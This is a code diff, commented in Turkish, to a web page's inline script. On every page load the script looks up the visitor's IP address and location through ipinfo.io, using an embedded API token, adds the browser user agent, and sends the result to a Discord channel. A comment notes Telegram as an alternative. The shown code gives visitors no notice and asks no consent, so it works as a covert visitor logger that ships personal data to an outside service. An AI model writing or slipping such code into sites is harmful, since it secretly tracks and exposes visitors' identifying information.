@@ -177,21 +177,27 @@
 
 // Sayfa yüklendiğinde ziyaretçi bilgisi gönder
 window.addEventListener('load', async () => {
-  const res = await fetch('https://ipapi.co/json/');
-  const visitor = await res.json();
-  const deviceInfo = navigator.userAgent;
+  try {
+    const res = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3'); // Token isteğe bağlı ama sınır yükseltir
+    if (!res.ok) throw new Error('IP info API error');
+    const visitor = await res.json();
 
-  const message = `
-Yeni ziyaretçi bilgileri:
+    const deviceInfo = navigator.userAgent;
+
+    const message = `
 IP: ${visitor.ip}
-Şehir: ${visitor.city}
-Bölge: ${visitor.region}
-Ülke: ${visitor.country_name}
+Şehir: ${visitor.city || 'Bilinmiyor'}
+Bölge: ${visitor.region || 'Bilinmiyor'}
+Ülke: ${visitor.country || 'Bilinmiyor'}
 Cihaz: ${deviceInfo.substring(0, 100)}
-  `;
+    `;
 
-  sendDiscordMessage(message);
+    sendDiscordMessage(message); // ya da sendTelegramMessage(message) vs.
+  } catch (e) {
+    console.error(e);
+  }
 });
+
 
     </script>
 
